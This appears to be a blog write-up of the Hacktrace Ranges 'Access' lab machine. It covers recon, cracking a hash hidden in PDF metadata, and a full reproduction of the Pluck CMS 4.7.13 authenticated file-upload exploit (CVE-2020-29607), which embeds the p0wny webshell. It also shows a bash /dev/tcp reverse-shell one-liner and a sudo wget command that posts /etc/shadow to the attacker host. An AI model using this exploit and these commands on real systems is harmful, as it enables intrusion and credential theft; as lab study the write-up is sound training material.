---
title : 'Hacktrace-Ranges: Access [Write-up]'
date : 2024-05-20 18.25 +0700           #DD-MM-YY hour timezone (+7 GMT)
categories : [Hacktrace-Ranges, Offensive]
tags : [machine,pluck,cve-2020-29607,password cracking,wget]
# author: 1                             # for single entry
---

## Getting Started

![Desktop View](/assets/img/hacktrace/access/Access_machine.png){: .center }

This is my first machine in hacktrace ranges, but I've already completed a few machines on hackthebox, so I should be able to complete this. Here is the details:

**Machine: Access**  
**Level: Easy**  
**OS: Linux**  
**IP: 10.1.2.157**


## Recon and Initial Steps

I began with an nmap scan:   
```terminal
❯ sudo nmap -sS -sV -sC 10.1.2.157
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-20 01:30 WIB
Nmap scan report for 10.1.2.157
Host is up (0.38s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000      1998572 Apr 19 03:51 sienna_eborchure.pdf
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.201.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
| http-robots.txt: 2 disallowed entries 
|_/data/ /docs/
|_http-generator: pluck 4.7.13
| http-title: Vien'le - Vien'le
|_Requested resource was http://10.1.2.157/?file=vien-le
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.37 seconds
```
**Nmap Options**
- sS: Performs a TCP SYN scan
- sV: Enables service version detection
- sC: Enables the use of default scripts

**Key Findings**
- FTP port 21: vsftpd 3.0.3
- HTTP port 80: Apache httpd 2.4.59 ((Debian))

After doing nmap scan, i notice something interesting from FTP service. We can see here that anonymous ftp login is allowed and it's contains a pdf file

> ftp-anon: Anonymous FTP login allowed (FTP code 230)

That means i can access the ftp service using `anonymous` as username and password. But before that, i quickly check the webserver that running on port 80 `http://10.1.2.157/` and perform manual scanning

After observing the website for a while and scanning/searching some vuln, i haven't gotten the initial foothold yet. I also tried some LFI payload because i see that the website load a local file `http://10.1.2.157/?file=vien-le` but no luck :(


## Initial Foothold
I noticed the website using pluck-cms 4.7.13 and there is login.php page `http://10.1.2.157/login.php`. I quickly search on google for default creds and use it but it's incorrect, and also need to wait for few minutes after entering wrong password for 5 times.

![Desktop View](/assets/img/hacktrace/access/img1.png){: .center }

Searched for plunk 4.7.13 exploit using searchsploit but it need authentication

```terminal
❯ searchsploit pluck 4.7.13             
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)                                                                 | php/webapps/49909.py
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Getting stuck, I stepped back and then tried to access ftp server using anonymous creds

```terminal
❯ ftp 10.1.2.157
Connected to 10.1.2.157.
220 (vsFTPd 3.0.3)
Name (10.1.2.157:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
❯ ftp> ls -lah
229 Entering Extended Passive Mode (|||47637|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        122          4096 Apr 19 03:52 .
drwxr-xr-x    2 0        122          4096 Apr 19 03:52 ..
-rw-r--r--    1 1000     1000      1998572 Apr 19 03:51 sienna_eborchure.pdf
226 Directory send OK.
❯ ftp> get sienna_eborchure.pdf
local: sienna_eborchure.pdf remote: sienna_eborchure.pdf
229 Entering Extended Passive Mode (|||45782|)
150 Opening BINARY mode data connection for sienna_eborchure.pdf (1998572 bytes).
100% |**************************************************************************************************************************|  1951 KiB  252.04 KiB/s    00:00 ETA
226 Transfer complete.
1998572 bytes received in 00:08 (240.81 KiB/s)
❯ ftp> exit
221 Goodbye.
```
I opened it and it was a normal brochure

![Desktop View](/assets/img/hacktrace/access/img2.png){: .center }

checked the metadata using exiftool

```terminal
❯ exiftool sienna_eborchure.pdf 
ExifTool Version Number         : 12.57
File Name                       : sienna_eborchure.pdf
Directory                       : .
File Size                       : 1999 kB
File Modification Date/Time     : 2024:04:19 10:51:52+07:00
File Access Date/Time           : 2024:05:21 02:46:46+07:00
File Inode Change Date/Time     : 2024:05:21 02:46:46+07:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.6
Linearized                      : No
Create Date                     : 2023:11:03 15:37:34-05:00
Modify Date                     : 2023:11:03 15:45:10-05:00
Has XFA                         : No
Language                        : en-US
XMP Toolkit                     : Image::ExifTool 12.57
Creator                         : your password is dcb76da384ae3028d6aa9b2ebcea01c9
Format                          : application/pdf
Producer                        : Adobe PDF Library 17.0
Trapped                         : False
Creator Tool                    : Adobe InDesign 19.0 (Macintosh)
Metadata Date                   : 2023:11:03 15:45:10-05:00
Derived From Document ID        : xmp.did:fb0632d3-6add-4b1a-b098-598e7a92fec5
Derived From Instance ID        : xmp.iid:eeff6700-f6c2-4d9e-978d-3266d2f18f41
Derived From Original Document ID: xmp.did:1550a558-fb22-481f-aacd-d74194ac9339
Derived From Rendition Class    : default
Document ID                     : xmp.id:acdd5a12-a4f7-48ec-9f41-b369a2ce03a0
History Action                  : converted
History Changed                 : /
History Parameters              : from application/x-indesign to application/pdf
History Software Agent          : Adobe InDesign 19.0 (Macintosh)
History When                    : 2023:11:03 15:37:34-05:00
Instance ID                     : uuid:d0e5e105-fcf6-474b-9773-f60431af9b81
Original Document ID            : xmp.did:1550a558-fb22-481f-aacd-d74194ac9339
Rendition Class                 : proof:pdf
Page Count                      : 22
```

And yes i got some progress, the metadata of `sienna_eborchure.pdf` contains a hashed password.

> dcb76da384ae3028d6aa9b2ebcea01c9

I ran hash-identifier to check the hash type,

```terminal
hash-identifier dcb76da384ae3028d6aa9b2ebcea01c9
```
the program identify MD5 for possible hashes. I saved the hashed password to pass.md5

```terminal
echo 'dcb76da384ae3028d6aa9b2ebcea01c9' > pass.md5 
```

Next step, i ran hashcat to crack the password

```terminal
hashcat -m 0 -a 0 pass.md5 /usr/share/wordlists/rockyou.txt
```
**Hashcat option**
- -m 0: To specifies the hash type (MD5)
- -a 0: To Specifies the attack mode (dictionary attack)

waiting... and then cracked!.

> dcb76da384ae3028d6aa9b2ebcea01c9:sayang

Using `sayang` as password to login at `http://10.1.2.157/login.php` resulted in succeed

![Desktop View](/assets/img/hacktrace/access/img3.png){: .center }


## Exploitation

From here it's pretty straightforward, Copied the exploit i found earlier from searchsploit then ran it

```python
# Exploit Title: Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)
# Date: 25.05.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://github.com/pluck-cms/pluck
# Software Link: https://github.com/pluck-cms/pluck/releases/tag/4.7.13
# Version: 4.7.13
# Tested on Xubuntu 20.04
# CVE: CVE-2020-29607

'''
Description:
A file upload restriction bypass vulnerability in Pluck CMS before 4.7.13 allows an admin
privileged user to gain access in the host through the "manage files" functionality,
which may result in remote code execution.
'''


'''
Import required modules:
'''
import sys
import requests
import json
import time
import urllib.parse


'''
User Input:
'''
target_ip = sys.argv[1]
target_port = sys.argv[2]
password = sys.argv[3]
pluckcmspath = sys.argv[4]


'''
Get cookie
'''
session = requests.Session()
link = 'http://' + target_ip + ':' + target_port + pluckcmspath
response = session.get(link)
cookies_session = session.cookies.get_dict()
cookie = json.dumps(cookies_session)
cookie = cookie.replace('"}','')
cookie = cookie.replace('{"', '')
cookie = cookie.replace('"', '')
cookie = cookie.replace(" ", '')
cookie = cookie.replace(":", '=')


'''
Authentication:
'''
# Compute Content-Length:
base_content_len = 27
password_encoded = urllib.parse.quote(password, safe='')
password_encoded_len = len(password_encoded.encode('utf-8'))
content_len = base_content_len + password_encoded_len

# Construct Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': str(content_len),
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Referer': 'http://' + target_ip + pluckcmspath + '/login.php',
    'Cookie': cookie,
    'Upgrade-Insecure-Requests': '1'
}

# Construct Data:
body = {
    'cont1': password,
    'bogus': '',
    'submit': 'Log in',
}

# Authenticating:
link_auth = 'http://' + target_ip + ':' + target_port + pluckcmspath + '/login.php'
auth = requests.post(link_auth, headers=header, data=body)
print('')
if 'error' in auth.text:
    print('Password incorrect, please try again:')
    exit()
else:
    print('Authentification was succesfull, uploading webshell')
    print('')


'''
Upload Webshell:
'''
# Construct Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'multipart/form-data; boundary=---------------------------5170699732428994785525662060',
    'Connection': 'close',
    'Referer': 'http://' + target_ip + ':' + target_port + pluckcmspath + '/admin.php?action=files',
    'Cookie': cookie,
    'Upgrade-Insecure-Requests': '1'
}

# Constructing Webshell payload: I'm using p0wny-shell: https://github.com/flozz/p0wny-shell
data = "-----------------------------5170699732428994785525662060\r\nContent-Disposition: form-data; name=\"filefile\"; filename=\"shell.phar\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" => $stdout,\n        \"cwd\" => getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => array('File not found / no read permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        return array(\n            'name' => basename($filePath),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => array('Invalid path / no write permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => array('Done.'),\n            'cwd' => getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&\")\n                    .replace(/</g, \"<\")\n                    .replace(/>/g, \">\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n\r\n-----------------------------5170699732428994785525662060\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload\r\n-----------------------------5170699732428994785525662060--\r\n"

# Uploading Webshell:
link_upload = 'http://' + target_ip + ':' + target_port + pluckcmspath + '/admin.php?action=files'
upload = requests.post(link_upload, headers=header, data=data)


'''
Finish:
'''
print('Uploaded Webshell to: http://' + target_ip + ':' + target_port + pluckcmspath + '/files/shell.phar')
print('')
```

For the context, this is an exploit script for a remote code execution (RCE) vulnerability in Pluck CMS version 4.7.13. The script is designed to upload a webshell (p0wny shell) to the target system, allowing the attacker to execute arbitrary commands.

The script takes four command-line arguments:

- target_ip: The IP address of the target.
- target_port: The port number of the target.
- password: The password for the Pluck CMS admin account.
- pluckcmspath: The path to the Pluck CMS installation.

```terminal
❯ python3 49909.py 10.1.2.157 80 sayang /

Authentification was succesfull, uploading webshell

Uploaded Webshell to: http://10.1.2.157:80//files/shell.phar
```

Shell was uploaded, i quickly boot up netcat listener and entered my revshell payload in the webshell
![Desktop View](/assets/img/hacktrace/access/img4.png){: .center }

![Desktop View](/assets/img/hacktrace/access/img5.png){: .center }
<!-- bash -c 'bash -i >& /dev/tcp/10.18.201.15/4444 0>&1' -->
> bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'

and i got the shell.

![Desktop View](/assets/img/hacktrace/access/img6.png){: .center }

## Privilege Escalation "www-data" -> "viente"

First thing i was do is read /etc/passwd file to get system users
```terminal
❯ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
|
|
|
viente:x:1000:1000:Viente,,,:/home/viente:/bin/bash
ftp:x:114:122:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
mysql:x:115:123:MySQL Server,,,:/nonexistent:/bin/false
```
I can see from here there's a user viente, almost identical with the name of the file from the website. It also have ftp that contains website password from earlier and mysql user but the service isn't running.  

I need to escalate my priv access to get flag in /home/$USER/user.txt, i tried to change user viente using `su` command with `sayang` as the password and.... it worked, i got the user flag.

![Desktop View](/assets/img/hacktrace/access/img8_edited.png){: .center }

```terminal
viente@Access:/var/www/html/pluck/files$ cat /home/$USER/user.txt
bfa*****************************
```

## Privilege Escalation "viente" -> "root"

My number one priority for vertical privilege escalation is to check users sudo permission
```terminal
viente@Access:~$ sudo -l
Matching Defaults entries for viente on Access:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User viente may run the following commands on Access:
    (ALL) NOPASSWD: /usr/bin/wget
viente@Access:~$ 
```

From that information i know that viente has permission to run `/usr/bin/wget`. Next i check gtfobins and found several function that can be abused to escalate privileges

![Desktop View](/assets/img/hacktrace/access/img9.png){: .center }

I also found that from `history` command the admin used wget fuction to upload /etc/shadow file 

```terminal
viente@Access:~$ history
1  sudo su
2  exit
3  ls
|
|
49  sudo -l
50  sudo wget --post-file=/etc/shadow 192.168.29.128
51  su root
|
|
```

So, i try that and got the root creds

```
viente@Access:~$ sudo wget --post-file=/etc/shadow 10.18.201.15
--2024-05-21 20:20:45--  http://10.18.201.15/
Connecting to 10.18.201.15:80... connected.
HTTP request sent, awaiting response... 
```

```terminal
❯ nc -lvnp 80  
listening on [any] 80 ...
connect to [10.18.201.15] from (UNKNOWN) [10.1.2.157] 42350
POST / HTTP/1.1
Host: 10.18.201.15
User-Agent: Wget/1.21.3
Accept: */*
Accept-Encoding: identity
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 1097

root:$y$j9T$Hm1APswuPtvtFxKTNpyC/.$FR2jXpIl/lBTi1ZK0iJxEbnEt0QitvPtnyvGMX96VkB:19828:0:99999:7:::
daemon:*:19828:0:99999:7:::
bin:*:19828:0:99999:7:::
|
|
viente:$y$j9T$wpSpKKwUmRxRxA5SIFdSb1$0/p5ScTwK/3/52i63rKMlnhDgKo0UhKVu7TxE6KV7YC:19832:0:99999:7:::
ftp:!:19828::::::
mysql:!:19829::::::
```

I Saved the hashed password and i know it was using yescrypt encryption after i found on google.

Essentially, the initial characters of the password field value in /etc/shadow identify the encryption algorithm:
- \$1\$ is Message Digest 5 (MD5)  
- \$2a\$ is blowfish  
- \$5\$ is 256-bit Secure Hash Algorithm (SHA-256)  
- \$6\$ is 512-bit Secure Hash Algorithm (SHA-512)  
- \$y\$ (or $7$) is yescrypt  
- none of the above means DES  

Source: https://www.baeldung.com/linux/shadow-passwords

Luckly, JohnTheRipper can crack yescrypt algorithm, i'm using SecLists for the wordlists  
https://github.com/danielmiessler/SecLists

```terminal
❯ john --format=crypt --wordlist=~/Desktop/10-million-password-list-top-1000000.txt  root.hash
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:09:33 2.63% (ETA: 17:16:57) 0g/s 49.35p/s 49.35c/s 49.35C/s 251090..201079
0g 0:00:16:50 4.69% (ETA: 17:13:18) 0g/s 50.34p/s 50.34c/s 50.34C/s 19101965..1640
0g 0:00:34:04 9.28% (ETA: 17:21:27) 0g/s 49.43p/s 49.43c/s 49.43C/s tyke..treesap
0g 0:00:42:02 11.20% (ETA: 17:29:33) 0g/s 48.29p/s 48.29c/s 48.29C/s franz1..flippin
0g 0:00:42:43 11.37% (ETA: 17:29:52) 0g/s 48.22p/s 48.22c/s 48.22C/s cfvfynf..carumba
0g 0:00:45:13 11.95% (ETA: 17:32:37) 0g/s 47.97p/s 47.97c/s 47.97C/s 060752..050764
toor             (?)
```

JohnTheRipper cracked the password, it was `toor`.

```terminal
viente@Access:~$ su root
Password: toor

root@Access:/home/viente# whoami
root
```

I gained the root access and the root flag

![Desktop View](/assets/img/hacktrace/access/img10_edited.png){: .center }

```terminal
root@Access:~# cat ril_root.txt
e952**************************49
```

And yes... i completed the machine, it was fun machine but i kinda hate the bruteforce phase. See you on the next writeups.